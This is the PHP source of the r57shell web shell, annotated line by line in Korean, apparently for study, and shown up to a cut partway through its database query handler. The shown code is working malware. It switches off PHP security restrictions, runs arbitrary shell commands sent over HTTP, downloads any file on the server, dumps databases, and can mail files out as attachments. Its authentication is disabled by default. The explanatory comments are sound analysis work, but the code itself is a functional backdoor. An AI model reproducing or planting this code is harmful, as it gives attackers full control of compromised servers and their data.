<?php
/******************************************************************************************************/
// FUNCTION_COED : FC-0001
// 언어 선택
// $language='ru' - 러시아어
// $language='eng' -  영어
// $language='kor' - 한국어
// $language='cha' - 중국어
// $language='jpn' -  일본어
$language='kor';


// 인증 사용 여부
// $auth = 1; - ( 인증을 사용 한다. = On  )
// $auth = 0; - ( 인증을 사용 하지 않는다  = Off )
$auth = 0;

// 변경 할것
// md5으로 암호화된 id,password, default는 r57
$name = 'ec371748dc2da624b35a4f8f685dd122'; // 유저 id
$pass = 'ec371748dc2da624b35a4f8f685dd122'; // 암호

/******************************************************************************************************/
// FUNCTION_COED : FC-0002
//


// 에러관한 내용을 출력하지 않는다.
error_reporting(0);

// safe_mode 설정 여부를 묻는다.
// 1이면 설정
// 0이면 미설정
//
if(@ini_get('safe_mode') == 1)
{
   // 설정 되어 있다면 초기화
   @ini_restore("safe_mode");
}

// open_basedir의 webroot 설정으로 상위 디렉토리 접근를 막는다.
// open_basedir에 값이 있다면 설정
// 없다면 미설정

//@ini_get : 설정의 값을 받아오는 함수
//따라서 @ini_get('open_basedir') !== ""이 의미하는 것은 이 open_basedir옵션이 있다면 if문을 실행한다는 뜻이다.
//open_basedir : 파일을 해당하는 디렉토리 및 하위 디렉토리에서만 열 수 있도록 하는 옵션
if(@ini_get('open_basedir') !== "")
{
   // 설정 되어 있다면 초기화
   @ini_restore("open_basedir");
}

// disable_functions는 사용되는 함수 제한
// disable_functions 값이 없다면
// 있다면 함수 제한됨,

if(@ini_get('disable_functions') !== "")
{
   // 설정 되어 있다면 초기화
   @ini_restore("disable_functions");
}

// allow_url_fopen는 url 방식으로 파일 include 함.
// allow_url_fopen가 0 인 경우 허용 하지 않음.
// 1인경우 허용

if(@ini_get('allow_url_fopen') == 0)
{
   // 설정 되어 있다면 초기화
   @ini_restore("allow_url_fopen");
}

// set_magic_quotes_runtime는 데이터를 주고 받을때 특수 문자를 치환하여 사용함.
// set_magic_quotes_runtime는 1이면 활성
// 0이면 비활성

@set_magic_quotes_runtime(0);

// set_time_limit는 특정 시간 이상 동작하면 실행 중지 함.
// set_time_limit가 0이면 계속 실행함.
@set_time_limit(0);

// max_execution_time 스크립트가 실행하는 최대 시간.
@ini_set('max_execution_time',0);

// output_buffering함수는 모든 출력 파일이 버퍼링을 갖는다.
// On인경우 활성
// Off인경우 비활성
//
@ini_set('output_buffering',0);


// safe_mode의 값을 가져온다.
//
$safe_mode = @ini_get('safe_mode');

// r57 버전 정보
$version = '1.4';

/******************************************************************************************************/
// FUNCTION_COED : FC-0003
//

// php 버전이 4.1.0이 아니면
// 아래 실행 하며 ( -1의 의미는  같지 않는 경우 )
//php에서 기본적으로 변수를 전송할 때는 call by value이지만 가끔 객체에 직접 접근을 해야하는 경우들이 있다.
//그 때 주솟값에 직접 접근해야 하기 때문에 변수 앞에 &를 붙인다.
if(version_compare(phpversion(), '4.1.0') == -1)
{
   //post방식으로 받아온 정보
   //http_post_vars는 php 4.1.0버전 아래에서 사용되었던 변수
   $_POST = &$HTTP_POST_VARS;
   //get방식으로 받아온 정보
   //http_get_vars는 php 4.1.0버전 아래에서 사용되었던 변수
   $_GET = &$HTTP_GET_VARS;
   //현재 주소란에 입력된 도메인을 기준으로 해당 도메인에 접속했을 때 기본적으로 연결되어 있는 폴더
   //http_get_vars는 php 4.1.0 버전 아래에서 사용되었던 변수
   $_SERVER = &$HTTP_SERVER_VARS;
   //클라이언트에 보내진 모든 쿠키들은 $_COOKIE에 들어가게 된다
   //너님의 소오오중한 쿸키를 받아오는 것 : HTTP_COOKIE_VARS
   $_COOKIE = &$HTTP_COOKIE_VARS;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0004
//

// get_magic_quotes_gpc 설정 되어 있다면
// 아래 실행
//
// stripslashes함수는 addslashes 함수로 db에 넘긴 값에는 특수문자 앞에 \ 가 있으므로
// \를 제거 해주는 역할이다.
if (@get_magic_quotes_gpc())
{

   foreach ($_POST as $k=>$v)
   {
       $_POST[$k] = stripslashes($v);
   }

   foreach ($_COOKIE as $k=>$v)
   {
       $_COOKIE[$k] = stripslashes($v);
   }
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0005
//

// 인증 설정이 On인경우
//
if($auth == 1)
{
 // isset는 변수가 설정 되었는지 여부 묻는다.
  // 설정되었다면 1 없다면 0를 리턴

  // PHP_AUTH_USER(유저 이름)이
   // 설정 되어 있지 않거나,
  //
  // PHP_AUTH_USER를 md5로 변경후
  // $name와 비교 할때 값이 틀리거나
  //
  //md5함수는 파라미터로 받은 문자열을 가지고 md5해시값을 생성해 준다.
  // PHP_AUTH_PW(암호)를 md5로 변경후
  // $pass와 비교 할 때 값이 틀리면
  // 아래를 실행하라.
  //
  // ( ex some.php?PHP_AUTH_USER=r57&PHP_AUTH_PW=r57 )
  //
  //이 코드는 아마 다른 사용자가 웹쉘을 사용할 수 없도록
  //사용자의 id와 passwd값을 미리 받아놓은 md5해시값과 비교를 실행하는 듯 하다.
   if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$name || md5($_SERVER['PHP_AUTH_PW'])!==$pass)
   {
       header('WWW-Authenticate: Basic realm="r57shell"');
       header('HTTP/1.0 401 Unauthorized');

     // r57 종료
     //웹쉘을 올린 해커만 이 쉘을 사용할 수 있도록 존재하는 코드로 추정
     //그렇기 때문에 access denied가 있다.
       exit("<b><a href=http://rst.void.ru>r57shell</a> : Access Denied</b>");
   }
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0006

// isset은 변수에 값이 존재하지 않는지를 검사해주는 역할을 실행한다.
//따라서 아래의 if문이 의미하는 것은 post방식으로 받은 do라는 변수에 값이 존재하고
//들어있는 값이 AJAX일 경우 아래의 코드를 실행한다는 의미이다.
//ex) www.google.com?do=AJAX

if(isset($_POST['do']) && $_POST['do']=="AJAX")
{
  // PHP상에서 현재 디렉토리 이동
  // post로 dir값에 인자를 받아 해당 디렉토리로 이동
  // chdir함수는 php에서 디렉토리를 이동할 때 사용한다.
  // ex) chdir('home') => home디렉토리로 이동하는 코드가 된다.
   @chdir($_POST['dir']);

  // strpos 함수
  // strpos함수는 strpos( 내 문자열, 찾을 문자열)
  // 내 문자열 안에 찾을
  // 문자열이 있다면 1리턴 없다면 0리턴

  // 만약
  // post방식으로 cmd의 인자값에 "dir" 값이 들어온다면
  // 아래 실행 ( ex . some.php?cmd=dir )

  // ===이 의미하는 것은 값 뿐만 아니라 데이터타입
  // 또한 같아야 한다는 것을 의미한다.
   if(strpos($_POST['cmd'], 'dir')===0)
  {
     // ex함수는 쉘 명령어를 실행시키고, 출력값을 반환해 주는 역할을 하는 함수이다.
     // incov함수는 데이터베이스나 외부에서 가져온 문자열의 인코딩 방식이 원래 파일의
     // 인코딩 방식과 맞지 않아 글자 깨짐을 방지하기 위해 사용함.
     // string iconv($원래 인코딩 방식, $변경할 인코딩 방식 , 인코딩 방식이 변경될 스트링)
     // cmd의 데이터 내용을 cp866에서 UTF-8 캐릭터셋으로 변경
     // 2164번째 라인에 ex함수 있음
       echo iconv("cp866", "UTF-8", ex($_POST['cmd']));
   }
  else
  {
     // post방식으로 cmd의 인자값에
     // "dir" 값이  안 들어온다면
     //

     // cmd의 데이터 내용을 windows-1251에서 UTF-8 캐릭터셋으로 변경
       echo iconv("windows-1251", "UTF-8", ex($_POST['cmd']));
   }
   // die()함수는 해당 스크립트를 종료시키는 역할을 수행한다.
   die();
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0007
//

// html 헤더 일부
//
$head_ =
'
<html>
<head>
<title>r57shell</title>
';


// 러시아어인 경우 캐리터셋 설정
$head_ru = '
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
';


// 영어인 경우 캐리터셋 설정
$head_eng = '
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
';

// 한국어인 경우 캐릴터셋 설정
$head_kor = '
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=enc-kr">
';


// html body 설정
$head_body = '

<STYLE>

tr
{
   BORDER-RIGHT:  #aaaaaa 1px solid;
   BORDER-TOP:    #eeeeee 1px solid;
   BORDER-LEFT:   #eeeeee 1px solid;
   BORDER-BOTTOM: #aaaaaa 1px solid;
   color: #000000;
}


td
{
   BORDER-RIGHT:  #aaaaaa 1px solid;
   BORDER-TOP:    #eeeeee 1px solid;
   BORDER-LEFT:   #eeeeee 1px solid;
   BORDER-BOTTOM: #aaaaaa 1px solid;
   color: #000000;
}


.table1
{
   BORDER: 0px;
   BACKGROUND-COLOR: #D4D0C8;
   color: #000000;
}


.td1
{
   BORDER: 0px;
   font: 7pt Verdana;
   color: #000000;
}


.tr1
{
   BORDER: 0px;
   color: #000000;
}


table
{
   BORDER:  #eeeeee 1px outset;
   BACKGROUND-COLOR: #D4D0C8;
   color: #000000;
}


input
{
   BORDER-RIGHT:  #ffffff 1px solid;
   BORDER-TOP:    #999999 1px solid;
   BORDER-LEFT:   #999999 1px solid;
   BORDER-BOTTOM: #ffffff 1px solid;
   BACKGROUND-COLOR: #e4e0d8;
   font: 8pt Verdana;
   color: #000000;
}


select
{
   BORDER-RIGHT:  #ffffff 1px solid;
   BORDER-TOP:    #999999 1px solid;
   BORDER-LEFT:   #999999 1px solid;
   BORDER-BOTTOM: #ffffff 1px solid;
   BACKGROUND-COLOR: #e4e0d8;
   font: 8pt Verdana;
   color: #000000;;
}


submit
{
   BORDER:  buttonhighlight 2px outset;
   BACKGROUND-COLOR: #e4e0d8;
   width: 30%;
   color: #000000;
}

/*
textarea
{
   BORDER-RIGHT:  #ffffff 1px solid;
   BORDER-TOP:    #999999 1px solid;
   BORDER-LEFT:   #999999 1px solid;
   BORDER-BOTTOM: #ffffff 1px solid;
   BACKGROUND-COLOR: #e4e0d8;
   font-size: medium;
   color: #000000;
}
*/

textarea
{
  BORDER-RIGHT:  #ffffff 1px solid;
  BORDER-TOP:    #999999 1px solid;
  BORDER-LEFT:   #999999 1px solid;
  BORDER-BOTTOM: #ffffff 1px solid;
  BACKGROUND-COLOR: #e4e0d8;
  font: Fixedsys bold;
  color: #000000;
}


BODY
{
   margin: 1px;
   color: #000000;
   background-color: #e4e0d8;
}


.block
{
   position: absolute;
   overflow: auto;
   width: 70px;
   height: 20px;
   left: 50%;
   top: 50%;
   margin-left: -35px;
   margin-top: -10px;
}


A:link {COLOR:red; TEXT-DECORATION: none}
A:visited { COLOR:red; TEXT-DECORATION: none}
A:active {COLOR:red; TEXT-DECORATION: none}
A:hover {color:blue;TEXT-DECORATION: none}


</STYLE>


<script language=\'javascript\'>

function hide_div(id)
{
   document.getElementById(id).style.display = \'none\';
   document.cookie=id+\'=0;\';
}


function show_div(id)
{
   document.getElementById(id).style.display = \'block\';
   document.cookie=id+\'=1;\';
}


function change_divst(id)
{
   if (document.getElementById(id).style.display == \'none\')
       show_div(id);
   else
       hide_div(id);
}


var req=null;
var READY_STATE_UNINITIALIZED=0;
var READY_STATE_LOADING=1;
var READY_STATE_LOADED=2;
var READY_STATE_INTERACTIVE=3;
var READY_STATE_COMPLETE=4;
var CommHis=new Array();
var HisP;


   function keyE(_b)
   {
      switch(_b.keyCode)
     {
         case 13:
            var _c = document.getElementById("ajax_cmd").value;
                var dir = document.getElementById("ajax_dir").value;

           if(_c)
           {
              //
              if(_c == "!cls")
              {
                  document.getElementById("report").value = "";
                  break;
              }

                   //
              if(_c == "!ll")
              {
                  _c = "ls -laF";
              }

                   //
                   if(_c == "!ds")
              {
                  _c = "dir /S";
              }

              document.getElementById("ajax_cmd").value = _c;
              CommHis[CommHis.length]=_c;
              HisP=CommHis.length;
              ajax(_c,dir);
           }
           break;

        case 38:
           if(HisP>0)
           {
               HisP--;
               document.getElementById("ajax_cmd").value=CommHis[HisP];
           }
           break;

        case 40:
           if(HisP<CommHis.length-1)
           {
              HisP++;
              document.getElementById("ajax_cmd").value=CommHis[HisP];
           }
           break;

        default:
           break;
     }
  }

function ajax(cmd,dir,unix){

   if(window.XMLHttpRequest)
  {
      req=new XMLHttpRequest();
  }
   else if(window.ActiveXObject)
  {
      req=new ActiveXObject("Microsoft.XMLHTTP");
  }

   if(req)
  {
       req.onreadystatechange=ajaxProcess;
       req.open("POST", "'.$_SERVER['PHP_SELF'].'", true);
       req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
       req.setRequestHeader("Accept-Charset", "windows-1251");
       req.send("dir="+dir+"&cmd="+cmd+"&do=AJAX");
   }
}

function ajaxProcess()
{
   var ready=req.readyState;
   var data="";
   show_div("load");

  if (ready==READY_STATE_COMPLETE)
  {
      data=req.responseText;
     report(data);
     hide_div("load");
  }
}

function report(data)
{
   document.getElementById("report").value+="["+document.getElementById("ajax_dir").value+"] "+document.getElementById("ajax_cmd").value+"\r\n"+data+"\r\n";
   document.getElementById("report").scrollTop += 1000000;
   document.getElementById("runned_cmd").childNodes[0].nodeValue = document.getElementById("ajax_cmd").value;
}

</script>';

/******************************************************************************************************/
// FUNCTION_COED : FC-0008
//

// 각국의 언어에 따라 html문장을 만든다.
// $head_는 html으 앞 부분
// $head_언어(kor,eng,ru)는 언어에 따라 변경
// $head_body는 html body부분
//
// 최종적으로 언어에 따라 $head를 만든다.
//


// 한국어인경우
//
if( $language=="kor")
{
   $head = $head_.$head_kor.$head_body;
}
elseif($language=="eng")
{
// 영어인경우

   $head = $head_.$head_eng.$head_body;

}elseif($language=="ru")
{
// 러시아 인경우
   $head = $head_.$head_ru.$head_body;
}


/******************************************************************************************************/
// FUNCTION_COED : FC-0009
//

// zipfile는 압축 클래스
// 테스트 검증 NO : PNO-0001.php 참고.
//

class zipfile
{
   // php에서 array()는 배열을 생성할 때 사용한다.
   var $datasec      = array();
   var $ctrl_dir     = array();
   var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
   var $old_offset   = 0;

   function unix2DosTime($unixtime = 0)
  {
       // getdate함수는 인자를 지정하지 않았을 때에는 현재의 시간을 반환하고
       // 인자가 지정된 경우에는 인자가 가리키는 정보를 연관 배열의 형태로 날짜 및 시간의 정보를 반환한다.
       $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);

       if ($timearray['year'] < 1980)
       {
           $timearray['year']    = 1980;
           $timearray['mon']     = 1;
           $timearray['mday']    = 1;
           $timearray['hours']   = 0;
           $timearray['minutes'] = 0;
           $timearray['seconds'] = 0;
       }
       // <<는 비트 연산이다.
       // << 25는 25bit민다는 의미이다.
       // 따라서 아래 코드의 비트 연산을 보면 년도, 월, 요일, 시간, 분 , 초에 대한 정보를 한번에 리턴하는 함수임을 알 수 있다.
       return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
               ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
   }

   function addFile($data, $name, $time = 0)
   {
       // str_replace 함수는 문자를 다른 문자로 바꿀 때 사용하는 함수이다.
       // str_replace('치환 될 문자', '치환할 문자', '검색할 값')형식을 가지고 있다.
       $name     = str_replace('\\', '/', $name);

       // dechex함수는 10진수를 입력받아서 16진수로 바꾸어 주는 함수이다.
       // 반대의 역할을 하는 함수로는 hexdec 함수가 있다.
       // unix2DosTime함수는 위에서 만든 함수로 현재의 시간 정보를
       // 비트 연산하여 한줄로 반환해 주는 함수이다.
       // 화살표 연산자 앞에 $this를 붙인 이유는 화살표 연산자를 사용할 때 형식을 지키기 위해서이다.
       $dtime    = dechex($this->unix2DosTime($time));

       //현재의 시간을 받아온 함수를 년, 월, 날, 요일, 시, 분을 \x를 기준으로 나누는 역할을 함.
       $hexdtime = '\x' . $dtime[6] . $dtime[7]
                 . '\x' . $dtime[4] . $dtime[5]
                 . '\x' . $dtime[2] . $dtime[3]
                 . '\x' . $dtime[0] . $dtime[1];

       //
       eval('$hexdtime = "' . $hexdtime . '";');

       $fr   = "\x50\x4b\x03\x04";
       $fr   .= "\x14\x00";
       $fr   .= "\x00\x00";
       $fr   .= "\x08\x00";
       $fr   .= $hexdtime;
       $unc_len = strlen($data);
       $crc     = crc32($data);
       $zdata   = gzcompress($data);
       $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
       $c_len   = strlen($zdata);
       $fr      .= pack('V', $crc);
       $fr      .= pack('V', $c_len);
       $fr      .= pack('V', $unc_len);
       $fr      .= pack('v', strlen($name));
       $fr      .= pack('v', 0);
       $fr      .= $name;
       $fr .= $zdata;
       $this -> datasec[] = $fr;
       $cdrec = "\x50\x4b\x01\x02";
       $cdrec .= "\x00\x00";
       $cdrec .= "\x14\x00";
       $cdrec .= "\x00\x00";
       $cdrec .= "\x08\x00";
       $cdrec .= $hexdtime;
       $cdrec .= pack('V', $crc);
       $cdrec .= pack('V', $c_len);
       $cdrec .= pack('V', $unc_len);
       $cdrec .= pack('v', strlen($name) );
       $cdrec .= pack('v', 0 );
       $cdrec .= pack('v', 0 );
       $cdrec .= pack('v', 0 );
       $cdrec .= pack('v', 0 );
       $cdrec .= pack('V', 32 );
       $cdrec .= pack('V', $this -> old_offset );
       $this -> old_offset += strlen($fr);
       $cdrec .= $name;
       $this -> ctrl_dir[] = $cdrec;
   }

   function file()
   {
       $data    = implode('', $this -> datasec);
       $ctrldir = implode('', $this -> ctrl_dir);

       return
           $data .
           $ctrldir .
           $this -> eof_ctrl_dir .
           pack('v', sizeof($this -> ctrl_dir)) .
           pack('v', sizeof($this -> ctrl_dir)) .
           pack('V', strlen($ctrldir)) .
           pack('V', strlen($data)) .
           "\x00\x00";
   }
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0010
//


// 테스트 검증 NO : PNO-0001.php 참고.
//

// 다운로드 하는 경우 사용 .
// 압축해서 다운로드 하거나 그냥 다운로드 한다.
//
//
function compress(&$filename,&$filedump,$compress)
{
   global $content_encoding;
   global $mime_type;

   if ($compress == 'bzip' && @function_exists('bzcompress'))
   {
       $filename  .= '.bz2';
       $mime_type = 'application/x-bzip2';
       $filedump = bzcompress($filedump);
   }
   else if ($compress == 'gzip' && @function_exists('gzencode'))
   {
       $filename  .= '.gz';
       $content_encoding = 'x-gzip';
       $mime_type = 'application/x-gzip';
       $filedump = gzencode($filedump);
   }
   else if ($compress == 'zip' && @function_exists('gzcompress'))
   {
       $filename .= '.zip';
       $mime_type = 'application/zip';
       $zipfile = new zipfile();
       $zipfile -> addFile($filedump, substr($filename, 0, -4));
       $filedump = $zipfile -> file();
   }
   else
   {
       $mime_type = 'application/octet-stream';
   }
}


/******************************************************************************************************/
// FUNCTION_COED : FC-0011
//


// mailattach는 파일을 첨부해서 메일로 보낸다.
//
function mailattach($to,$from,$subj,$attach)
{
   $headers  = "From: $from\r\n";
   $headers .= "MIME-Version: 1.0\r\n";
   $headers .= "Content-Type: ".$attach['type'];
   $headers .= "; name=\"".$attach['name']."\"\r\n";
   $headers .= "Content-Transfer-Encoding: base64\r\n\r\n";
   $headers .= chunk_split(base64_encode($attach['content']))."\r\n";

   if(@mail($to,$subj,"",$headers))
  {
      return 1;
  }

return 0;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0012
//

// db 관련 클래스
class my_sql
{
  var $host = 'localhost';
  var $port = '';
  var $user = '';
  var $pass = '';
  var $base = '';
  var $db   = '';
  var $connection;
  var $res;
  var $error;
  var $rows;
  var $columns;
  var $num_rows;
  var $num_fields;
  var $dump;


  /*
  @ connect
    db 연결 관련 프로세서
  */
  function connect()
  {
       switch($this->db)
      {
          case 'MySQL':

             if(empty($this->port)) { $this->port = '3306'; }
             if(!function_exists('mysql_connect')) return 0;
             $this->connection = @mysql_connect($this->host.':'.$this->port,$this->user,$this->pass);
             if(is_resource($this->connection)) return 1;
             $this->error = @mysql_errno()." : ".@mysql_error();

           break;

         case 'MSSQL':

            if(empty($this->port))
           {
              $this->port = '1433';
           }

              if(!function_exists('mssql_connect'))
              return 0;

             $this->connection = @mssql_connect($this->host.','.$this->port,$this->user,$this->pass);

            if($this->connection)
              return 1;

            $this->error = "Can't connect to server";

         break;

         case 'PostgreSQL':

            if(empty($this->port))
           {
              $this->port = '5432';
           }

              $str = "host='".$this->host."' port='".$this->port."' user='".$this->user."' password='".$this->pass."' dbname='".$this->base."'";

              if(!function_exists('pg_connect'))
              return 0;

            $this->connection = @pg_connect($str);

            if(is_resource($this->connection))
              return 1;

            $this->error = @pg_last_error($this->connection);

         break;

         case 'Oracle':

            if(!function_exists('ocilogon'))
              return 0;

            $this->connection = @ocilogon($this->user, $this->pass, $this->base);

            if(is_resource($this->connection))
              return 1;

            $error = @ocierror();

            $this->error=$error['message'];

         break;
      }

  return 0;
  }

  /*
  @ select_db
    seelct 관련 프로세서
  */
  function select_db()
  {
     switch($this->db)
     {
        case 'MySQL':

           if(@mysql_select_db($this->base,$this->connection))
              return 1;

           $this->error = @mysql_errno()." : ".@mysql_error();

        break;

        case 'MSSQL':

           if(@mssql_select_db($this->base,$this->connection))
              return 1;

           $this->error = "Can't select database";
        break;

        case 'PostgreSQL':
           return 1;

         break;

         case 'Oracle':
           return 1;

         break;
     }
  return 0;
  }


  /*
  @ query

  */
  function query($query)
  {
     $this->res=$this->error='';

     switch($this->db)
     {
        case 'MySQL':

           if(false===($this->res=@mysql_query('/*'.chr(0).'*/'.$query,$this->connection)))
           {
              $this->error = @mysql_error($this->connection);
              return 0;
           }
           else if(is_resource($this->res))
           {
              return 1;
           }

           return 2;

        break;

        case 'MSSQL':

           if(false===($this->res=@mssql_query($query,$this->connection)))
           {
                 $this->error = 'Query error';
              return 0;
           }
           else if(@mssql_num_rows($this->res) > 0)
           {
              return 1;
           }

           return 2;
        break;


        case 'PostgreSQL':

           if(false===($this->res=@pg_query($this->connection,$query)))
           {
              $this->error = @pg_last_error($this->connection);
              return 0;
           }
           else if(@pg_num_rows($this->res) > 0)
           {
              return 1;
           }

           return 2;

         break;

        case 'Oracle':

           if(false===($this->res=@ociparse($this->connection,$query)))
           {
              $this->error = 'Query parse error';
           }
           else
           {
              if(@ociexecute($this->res))
              {
                 if(@ocirowcount($this->res) != 0)
                    return 2;
              return 1;
                  }


                 $error = @ocierror();
              $this->error=$error['message'];
           }
        break;
     }

  return 0;
  }

  /*
  @ get_result

  */
  function get_result()
  {

     $this->rows=array();
     $this->columns=array();
     $this->num_rows=$this->num_fields=0;

     switch($this->db)
      {
          case 'MySQL':

           $this->num_rows=@mysql_num_rows($this->res);
           $this->num_fields=@mysql_num_fields($this->res);

           while(false !== ($this->rows[] = @mysql_fetch_assoc($this->res)));

           @mysql_free_result($this->res);

           if($this->num_rows)
           {
              $this->columns = @array_keys($this->rows[0]);
              return 1;
           }
        break;

        case 'MSSQL':

           $this->num_rows=@mssql_num_rows($this->res);
           $this->num_fields=@mssql_num_fields($this->res);

           while(false !== ($this->rows[] = @mssql_fetch_assoc($this->res)));

           @mssql_free_result($this->res);

           if($this->num_rows)
           {
              $this->columns = @array_keys($this->rows[0]);
              return 1;
           };

        break;

        case 'PostgreSQL':

           $this->num_rows=@pg_num_rows($this->res);
           $this->num_fields=@pg_num_fields($this->res);

           while(false !== ($this->rows[] = @pg_fetch_assoc($this->res)));

           @pg_free_result($this->res);

           if($this->num_rows)
           {
              $this->columns = @array_keys($this->rows[0]);
              return 1;
           }
         break;

         case 'Oracle':

            $this->num_fields=@ocinumcols($this->res);

           while(false !== ($this->rows[] = @oci_fetch_assoc($this->res)))
              $this->num_rows++;

           @ocifreestatement($this->res);

           if($this->num_rows)
           {
              $this->columns = @array_keys($this->rows[0]);
              return 1;
           }
         break;
      }

  return 0;
    }

  /*
  @ dump

  */
  function dump($table)
  {
     if(empty($table))
        return 0;

     $this->dump=array();
     $this->dump[0] = '##';
     $this->dump[1] = '## --------------------------------------- ';
     $this->dump[2] = '##  Created: '.date ("d/m/Y H:i:s");
     $this->dump[3] = '## Database: '.$this->base;
     $this->dump[4] = '##    Table: '.$table;
     $this->dump[5] = '## --------------------------------------- ';

     switch($this->db)
     {
        case 'MySQL':

           $this->dump[0] = '## MySQL dump';

           if($this->query('/*'.chr(0).'*/ SHOW CREATE TABLE `'.$table.'`')!=1)
              return 0;

           if(!$this->get_result())
              return 0;

           $this->dump[] = $this->rows[0]['Create Table'].";";
           $this->dump[] = '## --------------------------------------- ';

           if($this->query('/*'.chr(0).'*/ SELECT * FROM `'.$table.'`')!=1)
              return 0;

           if(!$this->get_result())
              return 0;

           for($i=0;$i<$this->num_rows;$i++)
           {
              foreach($this->rows[$i] as $k=>$v)
              {
                 $this->rows[$i][$k] = @mysql_real_escape_string($v);
              }

            $this->dump[] = 'INSERT INTO `'.$table.'` (`'.@implode("`, `", $this->columns).'`) VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
                   }
            break;


           case 'MSSQL':

               $this->dump[0] = '## MSSQL dump';

               if($this->query('SELECT * FROM '.$table)!=1)
               return 0;

               if(!$this->get_result())
               return 0;

               for($i=0;$i<$this->num_rows;$i++)
               {
                   foreach($this->rows[$i] as $k=>$v)
              {
                  $this->rows[$i][$k] = @addslashes($v);
              }
                   $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
               }
           break;

           case 'PostgreSQL':

               $this->dump[0] = '## PostgreSQL dump';

               if($this->query('SELECT * FROM '.$table)!=1)
               return 0;

               if(!$this->get_result())
               return 0;

               for($i=0;$i<$this->num_rows;$i++)
               {

                   foreach($this->rows[$i] as $k=>$v)
              {
                  $this->rows[$i][$k] = @addslashes($v);
              }

                   $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
               }
           break;

           case 'Oracle':

               $this->dump[0] = '## ORACLE dump';
               $this->dump[]  = '## under construction';
           break;

           default:
               return 0;
           break;
       }

   return 1;
   }

  /*
  @ close

  */
   function close()
   {
       switch($this->db)
       {
           case 'MySQL':

               @mysql_close($this->connection);

           break;

           case 'MSSQL':

               @mssql_close($this->connection);

           break;

           case 'PostgreSQL':

               @pg_close($this->connection);

           break;

           case 'Oracle':

               @oci_close($this->connection);
           break;
       }
   }

  /*
  @ affected_rows

  */
  function affected_rows()
  {
     switch($this->db)
     {
        case 'MySQL':
           return @mysql_affected_rows($this->res);
           break;

         case 'MSSQL':
           return @mssql_affected_rows($this->res);
           break;

        case 'PostgreSQL':
           return @pg_affected_rows($this->res);
           break;

        case 'Oracle':
           return @ocirowcount($this->res);
           break;

        default:
           return 0;
           break;
     }
  }
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0013
//

// 테스트 검증 NO : PNO-0001.php 참고.
//

// 다운로드 하는 프로세서
// PNO-0001.php?cmd=download_file&d_name=파일 경로 &compress=압축타입
//
if(!empty($_POST['cmd']) && $_POST['cmd']=="download_file" && !empty($_POST['d_name']))
{
  if(!$file=@fopen($_POST['d_name'],"r"))
  {
     err(1,$_POST['d_name']); $_POST['cmd']="";
  }
  else
  {
     @ob_clean();
     $filename = @basename($_POST['d_name']);
     $filedump = @fread($file,@filesize($_POST['d_name']));
     fclose($file);
     $content_encoding=$mime_type='';
     compress($filename,$filedump,$_POST['compress']);

     if (!empty($content_encoding))
     {
        header('Content-Encoding: ' . $content_encoding);
     }

     header("Content-type: ".$mime_type);
     header("Content-disposition: attachment; filename=\"".$filename."\";");
     echo $filedump;
     exit();
  }
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0014
//

// phpinfo 출력
if(isset($_GET['phpinfo']))
{
  echo @phpinfo();
  echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
  die();
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0015
//

if (!empty($_POST['cmd']) && $_POST['cmd']=="db_query")
{
  echo $head;

  $sql = new my_sql();
  $sql->db   = $_POST['db'];
  $sql->host = $_POST['db_server'];
  $sql->port = $_POST['db_port'];
  $sql->user = $_POST['mysql_l'];
  $sql->pass = $_POST['mysql_p'];
  $sql->base = $_POST['mysql_db'];
  $querys = @explode(';',$_POST['db_query']);

  echo '<body bgcolor=#e4e0d8>';

  if(!$sql->connect())
  {
     echo "<div align=center><font face=Verdana size=-2 color=red><b>".$sql->error."</b></font></div>";
  }
  else
  {

     if(!empty($sql->base)&&!$sql->select_db())
     {
        echo "<div align=center><font face=Verdana size=-2 color=red><b>".$sql->error."</b></font></div>";
     }
     else
     {
        foreach($querys as $num=>$query)
        {
           if(strlen($query)>5)
           {
              echo "<font face=Verdana size=-2 color=green><b>Query#".$num." : ".htmlspecialchars($query,ENT_QUOTES)."</b></font><br>";

              switch($sql->query($query))
              {
                 case '0':

                    echo "<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>".$sql->error."</b></font></td></tr></table>";

                 break;

                 case '1':

                    if($sql->get_result())
                    {

                       echo "<table width=100%>";

                       foreach($sql->columns as $k=>$v)
                       {
                          $sql->columns[$k] = htmlspecialchars($v,ENT_QUOTES);
                       }

                           $keys = @implode("&nbsp;</b></font></td><td bgcolor=#cccccc><font face=Verdana size=-2><b>&nbsp;", $sql->columns);
                         echo "<tr><td bgcolor=#cccccc><font face=Verdana size=-2><b>&nbsp;".$keys."&nbsp;</b></font></td></tr>";

                         for($i=0;$i<$sql->num_rows;$i++)
                       {
                          foreach($sql->rows[$i] as $k=>$v)
                          {
                             $sql->rows[$i][$k] = htmlspecialchars($v,ENT_QUOTES);
                          }

                          $values = @implode("&nbsp;</font></td><td><font face=Verdana size=-2>&nbsp;",$sql->rows[$i]);
                          echo '<tr><td><font face=Verdana size=-2>&nbsp;'.$values.'&nbsp;</font></td></tr>';
                       }
                       echo "</table>";
                    }
                 break;

                 case '2':

                    $ar = $sql->affected_rows()?($sql->affected_rows()):('0');
